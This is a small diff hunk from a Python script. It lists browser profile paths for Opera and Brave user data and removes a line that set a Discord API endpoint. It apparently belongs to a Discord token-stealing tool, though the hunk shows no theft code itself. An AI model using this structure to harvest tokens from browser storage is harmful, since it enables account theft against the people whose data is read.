@@ -27,7 +27,6 @@ PATHS = {
     #"Opera"             : CONFIG   + "opera/",
     #"Brave"             : LOCAL    + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
 }
-API = "https://discordapp.com/api/v9/"  # Discord API to use
 
 
 ##################################
